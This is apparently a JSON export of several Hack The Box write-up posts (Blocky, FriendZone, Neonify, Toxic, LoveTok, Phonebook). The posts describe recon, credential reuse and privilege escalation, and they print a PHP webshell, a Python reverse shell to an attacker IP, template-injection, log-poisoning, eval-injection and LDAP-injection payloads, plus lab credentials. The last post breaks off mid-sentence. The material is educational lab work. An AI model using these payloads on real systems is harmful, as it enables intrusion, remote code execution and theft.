[{"content":"This post documents my process for solving the Blocky box on Hack The Box. The machine revolves around web enumeration, WordPress, reverse engineering a Java plugin, MySQL credential hunting, and privilege escalation.\nReference https://0xdf.gitlab.io/2020/06/30/htb-blocky.html\nRecon Nmap nmap -sC -sV 10.10.10.37 PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 8192/tcp closed sophos Notes:\nRedirects to http://blocky.htb (add to /etc/hosts) Services: FTP, SSH, Apache/WordPress, MySQL Technologies WordPress 4.8 PHP MySQL Feroxbuster feroxbuster -u http://blocky.htb Found various WordPress and plugin directories Directory listings enabled in some locations There is also a comment section, possibly for XSS testing.\nAttacks \u0026amp; Enumeration The comment section did not have XSS No SQL injection No FTP exploit (anonymous login failed, exploit-db checks failed) Inspection of jar files in /plugins Used strings on custom plugin; found hardcoded credentials Java Plugin Analysis Reverse engineering the BlockyCore.class file revealed:\npackage com.myfirstplugin; public class BlockyCore { public String sqlHost = \u0026#34;localhost\u0026#34;; public String sqlUser = \u0026#34;root\u0026#34;; public String sqlPass = \u0026#34;8YsqfCTnvxAUeduzjNSXe22\u0026#34;; public void onServerStart() {} public void onServerStop() {} public void onPlayerJoin() { sendMessage(\u0026#34;TODO get username\u0026#34;, \u0026#34;Welcome to the BlockyCraft!!!!!!!\u0026#34;); } public void sendMessage(String username, String message) {} } The sqlUser and sqlPass are hardcoded. I used these credentials to access phpMyAdmin.\nExploitation Could not SSH using the same creds Used creds to log in to phpMyAdmin Verified users and privileges phpMyAdmin users included:\ndebian-sys-maint mysql.sys phpmyadmin root wordpress Privilege Escalation In the wp_users table, found the user Notch. Tried the same MySQL password for SSH with the notch username:\nssh notch@blocky.htb Successful login! id command revealed notch is in several privileged groups, including sudo.\nnotch@Blocky:~$ id uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Checking with sudo -l showed notch can run any command as root:\nnotch@Blocky:~$ sudo -l User notch may run the following commands on Blocky: (ALL : ALL) ALL Used sudo su to get a root shell:\nnotch@Blocky:~$ sudo su root@Blocky:/home/notch# ls minecraft user.txt root@Blocky:~# cd /root root@Blocky:~# ls root.txt root@Blocky:~# cat root.txt 3cf136f494e9bb904fcd902d52f803cc Lessons Learned Always enumerate and inspect all plugins/files; reverse engineering can reveal hardcoded secrets. Directory listings in WordPress installations can leak important files. Credentials are often reused across services—try them everywhere! Privilege escalation is sometimes as simple as finding a misconfigured sudo permission. Checking users in the application database can uncover valid system usernames. Writeup based on my own exploitation process, with inspiration from HTB community writeups.\n","permalink":"https://joonkim0625.github.io/posts/2025-07-03-htb-blocky/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003eBlocky\u003c/strong\u003e box on Hack The Box. The machine revolves around web enumeration, WordPress, reverse engineering a Java plugin, MySQL credential hunting, and privilege escalation.\u003c/p\u003e\n\u003ch2 id=\"reference\"\u003eReference\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://0xdf.gitlab.io/2020/06/30/htb-blocky.html\"\u003ehttps://0xdf.gitlab.io/2020/06/30/htb-blocky.html\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003ch3 id=\"nmap\"\u003eNmap\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sC -sV 10.10.10.37\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT     STATE  SERVICE VERSION\n21/tcp   open   ftp     ProFTPD 1.3.5a\n22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n80/tcp   open   http    Apache httpd 2.4.18\n8192/tcp closed sophos\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eNotes:\u003c/strong\u003e\u003c/p\u003e","title":"Blocky HTB Walkthrough"},{"content":"This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.\nReferences 0xdf’s writeup Python library hijack privilege escalation Recon NMAP Scan └──╼ [★]$ nmap -sC -sV 10.10.10.123 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT Nmap scan report for 10.10.10.123 Host is up (0.011s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Friend Zone Escape software |_http-server-header: Apache/2.4.29 (Ubuntu) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2025-07-03T20:02:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2025-07-03T23:02:09+03:00 |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds title: FriendZone HTB Walkthrough date: 2025-07-03 categories: [Penetration Testing, CTF Walkthrough, Privilege Escalation, Web Application Security] tags: [HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration] This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.\nReferences 0xdf’s writeup Python library hijack privilege escalation Recon NMAP Scan └──╼ [★]$ nmap -sC -sV 10.10.10.123 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT Nmap scan report for 10.10.10.123 Host is up (0.011s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Friend Zone Escape software |_http-server-header: Apache/2.4.29 (Ubuntu) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2025-07-03T20:02:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2025-07-03T23:02:09+03:00 |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds Key findings:\nOpen ports: 21 (FTP), 22 (SSH), 53 (DNS), 80/443 (HTTP/S), 139/445 (SMB/Samba) Notable: FTP, DNS, and multiple SMB shares Feroxbuster feroxbuster -u http://10.10.10.123 Found /wordpress (301), /fz.jpg (200), etc. Possible Wordpress site, Apache, Ubuntu DNS Note:\nFound CN friendzone.red — zone transfer possible.\nAttacks \u0026amp; Enumeration DNS (Port 53) Tried AXFR on friendzone.red — nothing interesting.\nMissed friendzoneportal.red initially (learned from 0xdf’s writeup).\nSMB/Samba Enumeration (Port 139/445) smbclient -L //10.10.10.123/ -N Found general, Development, and other shares.\nAccessed general share and found creds.txt:\nadmin:WORKWORKHhallelujah@# Tried credentials on SSH, FTP, and SMB shares (only Development was accessible, but empty).\nWeb (443 / Virtual Hosts) HTTPS site is mostly empty, but /js/js/ gives a base64-ish string. Looked for hidden endpoints, found /admin, /wordpress (empty), /js (interesting). Login at administrator1.friendzone.red using the creds works and leads to /dashboard.php. LFI via pagename Param dashboard.php revealed possible Local File Inclusion (LFI) via pagename param:\ndashboard.php?image_id=a.jpg\u0026amp;pagename=timestamp Confirmed LFI by including ../uploads/upload. Getting Source Code Used PHP filters (and LFI) to read source code for dashboard.php, login.php, and upload.php.\nUploading Webshell via SMB Uploaded a webshell to the Development share:\n\u0026lt;?php system($_REQUEST[\u0026#34;cmd\u0026#34;]); ?\u0026gt; Triggered the webshell via LFI:\ndashboard.php?image_id=a.jpg\u0026amp;pagename=../../../etc/Development/test\u0026amp;cmd=id Note: cmd=id works as a parameter to the uploaded webshell. Privilege Escalation Found MySQL credentials: db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ Used creds to escalate to local user friend. Used pspy to find root running /opt/server_admin/reporter.py (which imports os). Python library hijack:\nModified /usr/lib/python2.7/os.py to include a reverse shell payload.\nWaited for cron to trigger and got root shell. import pty import socket s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.14.6\u0026#34;,443)) dup2(s.fileno(),0) dup2(s.fileno(),1) dup2(s.fileno(),2) pty.spawn(\u0026#34;/bin/bash\u0026#34;) s.close() Lessons Learned Always enumerate all DNS and virtual hosts; CTFs hide clues everywhere. LFI and file upload vulnerabilities can be chained for RCE. Privilege escalation often involves writable scripts or modules; watch for Python hijacks. Tools like pspy are invaluable for watching root-level cronjobs and processes. Writeup based on my own exploitation process, with inspiration from community writeups.\n","permalink":"https://joonkim0625.github.io/posts/2025-07-03-htb-friendzone/","summary":"\u003cp\u003eThis post covers my process for solving the \u003cstrong\u003eFriendZone\u003c/strong\u003e box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.\u003c/p\u003e\n\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html\"\u003e0xdf’s writeup\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://rastating.github.io/privilege-escalation-via-python-library-hijacking/\"\u003ePython library hijack privilege escalation\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003ch3 id=\"nmap-scan\"\u003eNMAP Scan\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e└──╼ [★]$ nmap -sC -sV 10.10.10.123\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT\nNmap scan report for 10.10.10.123\nHost is up (0.011s latency).\nNot shown: 993 closed tcp ports (reset)\nPORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 3.0.3\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)\n|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)\n|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)\n53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu\n80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Friend Zone Escape software\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n443/tcp open  ssl/http    Apache httpd 2.4.29\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n| tls-alpn: \n|_  http/1.1\n|_ssl-date: TLS randomness does not represent time\n|_http-title: 404 Not Found\n| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO\n| Not valid before: 2018-10-05T21:02:30\n|_Not valid after:  2018-11-04T21:02:30\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\nService Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n| smb2-time: \n|   date: 2025-07-03T20:02:08\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: friendzone\n|   NetBIOS computer name: FRIENDZONE\\x00\n|   Domain name: \\x00\n|   FQDN: friendzone\n|_  System time: 2025-07-03T23:02:09+03:00\n|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown)\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.29 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003chr\u003e\n\u003ch2 id=\"tags-htb-friendzone-smb-lfi-privilege-escalation-python-hijack-reverse-shell-dns-enumeration\"\u003etitle: FriendZone HTB Walkthrough\ndate: 2025-07-03\ncategories: [Penetration Testing, CTF Walkthrough, Privilege Escalation, Web Application Security]\ntags: [HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration]\u003c/h2\u003e\n\u003cp\u003eThis post covers my process for solving the \u003cstrong\u003eFriendZone\u003c/strong\u003e box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.\u003c/p\u003e","title":"FriendZone HTB Walkthrough"},{"content":"This post documents my process for solving the Neonify box on Hack The Box. This challenge revolves around a Ruby application vulnerable to Server-Side Template Injection (SSTI) via a regex newline bypass.\nChallenge Description It\u0026rsquo;s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!\nSolution After looking at the source code, I noticed it was a Ruby application and suspected some kind of command injection. I didn\u0026rsquo;t immediately see the path, so I referred to a writeup and discovered that the challenge is about \u0026ldquo;ERB SSTI via newline regex bypass.\u0026rdquo; There’s very little public writeup info on this exact method, which made it a great learning opportunity.\nERB Template Injection Reference (TrustedSec) HTB Neonify Writeup Ruby Regex Security Ruby Regex Explanation Application Source Code Key snippet from the controller:\nclass NeonControllers \u0026lt; Sinatra::Base configure do set :views, \u0026#34;app/views\u0026#34; set :public_dir, \u0026#34;public\u0026#34; end get \u0026#39;/\u0026#39; do @neon = \u0026#34;Glow With The Flow\u0026#34; erb :\u0026#39;index\u0026#39; end post \u0026#39;/\u0026#39; do if params[:neon] =~ /^[0-9a-z ]+$/i @neon = ERB.new(params[:neon]).result(binding) else @neon = \u0026#34;Malicious Input Detected\u0026#34; end erb :\u0026#39;index\u0026#39; end end There’s a regex intended to block malicious input, but it only allows numbers, letters, and spaces. However, the ^ and $ anchors, and the way newlines are handled, create an opportunity for a newline-based bypass.\nExploiting the SSTI (Server-Side Template Injection) By submitting input that includes a newline ( ), the filter does not block content after the newline. The second line is directly injected into the template.\nExample Payload:\na \u0026lt;%=%x(cat flag.txt)%\u0026gt; How to send:\nThe web form itself won’t interpret as a newline, so use a web proxy tool (e.g., Burp Suite) to submit a real multiline payload. You may also need to URL-encode your submission. Result: Submitting the payload (with a newline) executes the command and displays the flag (or directory listing if you use ls):\n\u0026lt;h1 class=\u0026#34;glow\u0026#34;\u0026gt;a Gemfile Gemfile.lock app config config.ru flag.txt public \u0026lt;/h1\u0026gt; You can then read the flag with:\n\u0026lt;%=%x(cat flag.txt)%\u0026gt; Lessons Learned Regex filters are not a substitute for real sanitization—newline handling can break even a “tight” regex. Template injection vulnerabilities in Ruby (ERB) can be subtle and devastating. Use of ERB.new(user_input).result(binding) is extremely dangerous. Always test filters for newline and other \u0026ldquo;special character\u0026rdquo; bypasses, especially in CTFs and web security challenges. Sometimes, reviewing public writeups and references is necessary to learn obscure or novel exploit methods. Writeup based on my exploitation process and public references.\n","permalink":"https://joonkim0625.github.io/posts/2025-04-22-neonify/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003eNeonify\u003c/strong\u003e box on Hack The Box. This challenge revolves around a Ruby application vulnerable to Server-Side Template Injection (SSTI) via a regex newline bypass.\u003c/p\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIt\u0026rsquo;s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!\u003c/p\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eAfter looking at the source code, I noticed it was a Ruby application and suspected some kind of command injection. I didn\u0026rsquo;t immediately see the path, so I referred to a writeup and discovered that the challenge is about \u0026ldquo;ERB SSTI via newline regex bypass.\u0026rdquo; There’s very little public writeup info on this exact method, which made it a great learning opportunity.\u003c/p\u003e","title":"Neonify HTB Walkthrough"},{"content":"This post documents my process for solving the Toxic box on Hack The Box. This box is all about PHP insecure deserialization, exploiting LFI, and using log poisoning to achieve remote code execution.\nSynopsis PHP insecure deserialization to LFI that abuses log poisoning for RCE.\nLearning References:\nhttps://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad The official writeup I wasn\u0026rsquo;t sure what to do at first, so I checked the writeup after struggling for a while.\nChallenge Analysis \u0026amp; Source Code Review The web page didn\u0026rsquo;t reveal much, but looking at the source code, you see:\n\u0026lt;?php spl_autoload_register(function ($name){ if (preg_match(\u0026#39;/Model$/\u0026#39;, $name)) { $name = \u0026#34;models/${name}\u0026#34;; } include_once \u0026#34;${name}.php\u0026#34;; }); if (empty($_COOKIE[\u0026#39;PHPSESSID\u0026#39;])) { $page = new PageModel; $page-\u0026gt;file = \u0026#39;/www/index.html\u0026#39;; setcookie( \u0026#39;PHPSESSID\u0026#39;, base64_encode(serialize($page)), time()+60*60*24, \u0026#39;/\u0026#39; ); } $cookie = base64_decode($_COOKIE[\u0026#39;PHPSESSID\u0026#39;]); unserialize($cookie); Since the challenge is about PHP\u0026rsquo;s insecure deserialization, unserialize() is the dangerous function. It’s called directly on a user-controlled cookie.\nThe PageModel class:\n\u0026lt;?php class PageModel { public $file; public function __destruct() { include($this-\u0026gt;file); } } When the PageModel object is destroyed, it includes whatever file is specified in $file. By manipulating the serialized cookie, we can include arbitrary files!\nLFI via Deserialization Here’s how the cookie looks (after base64 decoding):\nO:9:\u0026#34;PageModel\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:15:\u0026#34;/www/index.html\u0026#34;;} Change the file path to another file, like /etc/passwd:\nO:9:\u0026#34;PageModel\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:11:\u0026#34;/etc/passwd\u0026#34;;} Encode this string in base64, set it as your PHPSESSID, and refresh—if the byte count matches, you get the file contents.\nLog Poisoning for RCE To get code execution, exploit log poisoning:\nThe server logs User-Agent headers to /var/log/nginx/access.log. Send a request with a User-Agent payload: \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt; Use the LFI (via the manipulated cookie) to include /var/log/nginx/access.log. Cookie for LFI:\nEncoded data of: O:9:\u0026#34;PageModel\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:25:\u0026#34;/var/log/nginx/access.log\u0026#34;;} Request example:\nGET /?cmd=cat+/flag_mTjJd HTTP/1.1 Host: 83.136.255.10:41451 User-Agent: \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt; Cookie: PHPSESSID=\u0026lt;base64-of-LFI-payload\u0026gt; Then, when you revisit the page with the malicious cookie and trigger the inclusion of the log file, the payload executes. You can use the cmd GET parameter to execute arbitrary commands, such as:\nls / cat flag_mTjJd Sample output:\n10.30.18.176 - 200 \u0026#34;GET /?cmd=cat+flag_mTjJd HTTP/1.1\u0026#34; \u0026#34;-\u0026#34; \u0026#34;HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}\u0026#34; Lessons Learned Insecure deserialization in PHP is extremely dangerous, especially when paired with magic methods like __destruct(). Including user-controlled files leads to LFI and can be chained with log poisoning for code execution. Log poisoning works because web servers typically log unfiltered input, like User-Agent headers, which can be crafted to contain PHP code. Always check for serialized objects in cookies, magic methods, and file inclusions when reviewing CTF or real-world PHP apps. Writeup based on my own exploitation process, with inspiration from CTF and security community references.\n","permalink":"https://joonkim0625.github.io/posts/2025-04-21-toxic/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003eToxic\u003c/strong\u003e box on Hack The Box. This box is all about PHP insecure deserialization, exploiting LFI, and using log poisoning to achieve remote code execution.\u003c/p\u003e\n\u003ch2 id=\"synopsis\"\u003eSynopsis\u003c/h2\u003e\n\u003cp\u003ePHP insecure deserialization to LFI that abuses log poisoning for RCE.\u003c/p\u003e\n\u003ch2 id=\"learning\"\u003eLearning\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eReferences:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad\"\u003ehttps://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eThe official writeup\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eI wasn\u0026rsquo;t sure what to do at first, so I checked the writeup after struggling for a while.\u003c/p\u003e\n\u003ch2 id=\"challenge-analysis--source-code-review\"\u003eChallenge Analysis \u0026amp; Source Code Review\u003c/h2\u003e\n\u003cp\u003eThe web page didn\u0026rsquo;t reveal much, but looking at the source code, you see:\u003c/p\u003e","title":"Toxic HTB Walkthrough"},{"content":"This post documents my process for solving the LoveTok box on Hack The Box. The challenge involves analyzing PHP source code, understanding the misuse of addslashes, and exploiting command injection through the eval function.\nDescription True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung\u0026hellip; you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin\u0026rsquo; (at your door). Come and check it out, but don\u0026rsquo;t try to cheat love because love cheats back.\nThe source code must be downloaded to analyze the website.\nReference:\nhttps://swordandcircuitboard.com/php-addslashes-command-injection-bypass/\nSource Code Review TimeModel.php:\n\u0026lt;?php class TimeModel { public function __construct($format) { $this-\u0026gt;format = addslashes($format); [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-\u0026gt;prediction = \u0026#34;+${d} day +${h} hour +${m} minute +${s} second\u0026#34;; } public function getTime() { eval(\u0026#39;$time = date(\u0026#34;\u0026#39; . $this-\u0026gt;format . \u0026#39;\u0026#34;, strtotime(\u0026#34;\u0026#39; . $this-\u0026gt;prediction . \u0026#39;\u0026#34;));\u0026#39;); return isset($time) ? $time : \u0026#39;Something went terribly wrong\u0026#39;; } } The key line is:\neval(\u0026#39;$time = date(\u0026#34;\u0026#39; . $this-\u0026gt;format . \u0026#39;\u0026#34;, strtotime(\u0026#34;\u0026#39; . $this-\u0026gt;prediction . \u0026#39;\u0026#34;));\u0026#39;); The $format is taken from user input and only passed through addslashes, which is not sufficient to prevent code injection.\nExploitation A bypass technique for addslashes command injection is discussed in this reference article.\nYou can exploit the vulnerability with a payload like:\n${system($_GET[1])}\u0026amp;1=cat+../flagBweet This payload breaks out of the intended context and executes arbitrary commands, such as reading the flag.\nLessons Learned Never use addslashes as your only input validation/sanitization. Always use proper validation and context-aware escaping. PHP\u0026rsquo;s eval is dangerous when handling user-supplied data, especially if input is not strictly sanitized. Reviewing source code is a powerful way to discover hidden vulnerabilities and exploitation techniques. Attackers often look for creative ways to bypass insufficient sanitization using PHP features like variable variables and braces. Writeup based on my own exploitation process and references from the CTF and web security communities.\n","permalink":"https://joonkim0625.github.io/posts/2025-04-20-lovetok/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003eLoveTok\u003c/strong\u003e box on Hack The Box. The challenge involves analyzing PHP source code, understanding the misuse of \u003ccode\u003eaddslashes\u003c/code\u003e, and exploiting command injection through the eval function.\u003c/p\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eTrue love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung\u0026hellip; you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin\u0026rsquo; (at your door). Come and check it out, but don\u0026rsquo;t try to cheat love because love cheats back.\u003c/p\u003e","title":"LoveTok HTB Walkthrough"},{"content":"This post documents my process for solving the Phonebook box on Hack The Box. The box focuses on LDAP injection and brute-forcing credentials using knowledge of LDAP search/filter syntax.\nSolve I didn’t find any obvious attack vectors except for a DOM-based HTML injection. After checking a writeup, I learned the challenge was about LDAP injection—a topic I had little prior experience with.\nWhat is LDAP Injection? According to PayloadAllTheThings, LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping.\nHints On the page, there are several hints:\n\u0026ldquo;You can now login using the workstation username and password\u0026rdquo; Title: \u0026ldquo;Phonebook - Login\u0026rdquo; Potential username: \u0026ldquo;reese\u0026rdquo; These suggest the app uses LDAP for directory service.\nBypassing Login Trying tools like nikto or dirbuster didn’t help. Similar to SQLi testing, using ( or ) can sometimes break LDAP queries. Example payload:\nuser = Reese)(!(\u0026amp;(1=0 pass = q)) This resulted in:\nquery = (\u0026amp;(uid=admin)(!(\u0026amp;(1=0)(userPassword=q)))) Using “Reese” (from the page) let me bypass authentication, but to fully exploit the system, more was needed.\nSearching via the app’s search bar, I found:\nEimile Pantlin\tepantlin1c@admin.ch\t690-650-9785 Trying “epantlin1c” with a similar payload worked too. Entering . in the search bar listed all possible users—likely because emails have dots.\nThe writeup referenced HackTricks LDAP Injection for more bypass tricks.\nBlind LDAP Injection (Brute-forcing Passwords) The main goal: discover the 